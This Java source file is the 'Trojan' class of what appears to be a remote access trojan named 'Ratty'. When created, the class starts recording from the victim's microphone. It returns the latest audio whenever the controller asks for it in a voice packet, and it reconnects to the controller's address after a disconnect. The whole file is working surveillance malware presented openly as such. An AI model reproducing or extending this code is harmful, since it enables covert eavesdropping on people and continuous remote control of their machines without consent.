package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.util.VoiceRecorder;

public final class Trojan implements IConnectionObserver {
	
	private VoiceRecorder voiceRecorder;
	
	private static final int VOICE_BUFFER_SIZE = 1024 << 3;
	
	public Trojan() {
		voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
		
		voiceRecorder.start();
	}
	
	private void handleVoicePacket(final VoicePacket packet) {
		final byte[] data = voiceRecorder.getLastRecord();
		
		packet.setData(data);
	}
	
	@Override
	public void packetReceived(final ActiveConnection client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		if (clazz == VoicePacket.class) {
			final VoicePacket voice = (VoicePacket)packet;
			
			handleVoicePacket(voice);
		}
		
		packet.execute(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		voiceRecorder.stop();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
